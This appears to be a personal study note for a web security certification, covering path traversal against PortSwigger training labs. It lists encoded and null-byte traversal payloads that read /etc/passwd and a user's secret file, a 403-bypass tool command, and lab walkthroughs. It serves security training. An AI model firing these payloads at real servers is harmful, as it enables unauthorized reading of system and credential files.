### Stage 3
### What is it?
Local File Inclusion. But path traversal aka directory traversal enable an attacker to read arbitrary files on the server. Could also write files. 

In PortSwigger, this is under **Path Traversal**.

In Unix: `/var/www/images/../../../etc/passwd``
In Windows: `..\..\..\windows\win.ini`
- Windows can use `/` and `\`
### How to Identify + Payloads
Products + Unauthenticated
Use on `GET /image?filename=`
```
/home/carlos/secret
../../../home/carlos/secret
....//....//....//home/carlos/secret
..%252f..%252f..%252fhome/carlos/secret
/var/www/images/../../../home/carlos/secret
../../../home/carlos/secret%00.png
```

### Identify Vulnerabilities (Automated)
Note: Add the fuzzing path traversal payload from drop-down list option, _**Add from list ...**_. Then set processing rule on the provided payload to replace the FILE place holder with reg-ex `\{FILE\}` for each of the attacks. Then change to `/home/carlos/secret`. If got 403, use 403bypasser and [Path Traversal Authz](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#path-traversal-authz) (see below).
![[LFI-20260220155958631.png|485]]

### Identify Vulnerabilities (Manual)
- `GET /image?filename=../../../home/carlos/secret`
	- 200 OK
		- [[LFI#3.1. Lab File path traversal, simple case ⭕️]]
	- "No such file"
		- **Solution:** `GET /image?filename=/home/carlos/secret`
			- [[LFI#3.2. Lab File path traversal, traversal sequences blocked with absolute path bypass ⭕️]]
		- **Solutions**
			- `GET /image?filename=..././..././..././home/carlos/secret`
			- `GET /image?filename=....//....//....//home/carlos/secret`
				- [[LFI#3.3. Lab File path traversal, traversal sequences stripped non-recursively ⭕️]]
		- **Solutions**
			- `GET /image?filename=..%252f..%252f..%252fhome/carlos/secret`
			- `GET /image?filename=..%25%32%66..%25%32%66..%25%32%66home/carlos/secret`
			- Double encode using cyberchef (check lab)
				- [[LFI#3.4. Lab File path traversal, traversal sequences stripped with superfluous URL-decode ⭕️]]
		- **Solution:** `GET /image?filename=../../../home/carlos/secret%00.png`
			- [[LFI#3.6. Lab File path traversal, validation of file extension with null byte bypass ⭕️]]
	- "Missing parameter 'filename'" OR `/var/www/images/1.jpg`
		- `GET image?filename=/var/www/images/../../../home/carlos/secret`
			- [[LFI#3.5. Lab File path traversal, validation of start of path ⭕️

Can try these too
```
..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/carlos/secret

```

**NOTE**
Once gotten admin access, can read `/etc/passwd` and `/etc/hostname` but `/home/carlos/secret` got `403 Forbidden`. 

If you see `imagefile=` like `GET /admin_controls/metrics/admin-image?imagefile=` try
```
GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**403Bypasser**
```
cd /Users/shixian/Documents/Hax/bscp/403bypasser
source 403bypasser_venv/bin/activate
python3 403bypasser.py -u https://TARGET.net -d /home/carlos/secret
```

---
#### 3.1. Lab: File path traversal, simple case ⭕️
This lab contains a path traversal vulnerability in the display of product images.
To solve the lab, retrieve the contents of the `/etc/passwd` file.
1. Click view details > right click on image and open image in new tab > *make sure filter settings have images enabled* > send the `GET /image?filename` request to Repeater.
2. Replace that with `GET /image?filename=../../../etc/passwd` and solved.
	1. ![[LFI-20260115173137533.png]]
>[!tip] How to Identify this Vulnerability?
>1. `GET` request referencing a file like an image `/image?filename=`

---
#### 3.2. Lab: File path traversal, traversal sequences blocked with absolute path bypass ⭕️
This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the `/etc/passwd` file.
1. Follow Step 2 of Lab 1 will get us an error: "No such file"
	1. ![[LFI-20260115173443832.png]]
2. Enter this to solve: `GET /image?filename=/etc/passwd`. Notice the difference is we didn't need `../../../`
	1. ![[LFI-20260115173602520.png]]
---
#### 3.3. Lab: File path traversal, traversal sequences stripped non-recursively ⭕️
This lab contains a path traversal vulnerability in the display of product images.
The application strips path traversal sequences from the user-supplied filename before using it.
To solve the lab, retrieve the contents of the `/etc/passwd` file.
1. Following steps from Lab 2 will get us "No such file" error
	1. ![[LFI-20260115173857065.png|485]]
2. To solve, just double the `.` and `/` like `....//....//....//etc/passwd` and solve.
	1. ![[LFI-20260115174056658.png]]
---
#### 3.4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode ⭕️
This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.
1. Following the solutions from previous labs gets an error.
2. To solve, enter this payload: `..%252f..%252f..%252fetc/passwd`. *The `/` character is superfluous URL encoded*. Meaning the `%` in `%2f` gets URL encoded into `%25` which gets us `%252f`.
	1. ![[LFI-20260115174453750.png]]

**Use in exam**
>This, `..%25%32%66..%25%32%66..%25%32%66etc/passwd`, also works. *The `/` character is double URL encoded.* 

```
Double URL-encode ../../../etc/passwd
(e.g. %252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd)
It is recommended to use cyberchef to encode

%252E%252E%252F%252E%252E%252F%252E%252E%252Fhome%252Fcarlos%252Fsecret
```
---
#### 3.5. Lab: File path traversal, validation of start of path ⭕️
This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the `/etc/passwd` file.
1. Notice the request has the full file path: `/var/www/images/1.jpg` instead of just `1.jpg`
2. Replace `1.jpg` with `../../../etc/passwd` to solve.
	1. ![[LFI-20260115175851917.png]]
>[!tip] How to Identify this Vulnerability?
>1. `GET` request referencing a file like an image `/image?filename=
>2. References the full file path instead of just the filename

---
#### 3.6. Lab: File path traversal, validation of file extension with null byte bypass ⭕️
This lab contains a path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the `/etc/passwd` file.
1. Add a null byte `%00` and the expected file extension `.png` to solve: `../../../etc/passwd%00.png`.
![[LFI-20260115175535252.png]]




